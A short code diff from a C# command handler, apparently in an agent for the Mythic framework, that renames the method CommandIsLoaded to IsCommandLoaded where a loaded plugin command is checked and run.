@@ -346,7 +346,7 @@ namespace Athena.Commands
         /// <param name="job">MythicJob containing execution parameters</param>
         private async Task<object> CheckAndRunPlugin(MythicJob job)
         {
-            if (await this.assemblyHandler.CommandIsLoaded(job.task.command))
+            if (await this.assemblyHandler.IsCommandLoaded(job.task.command))
             {
                 return await this.assemblyHandler.RunLoadedCommand(job);
             }
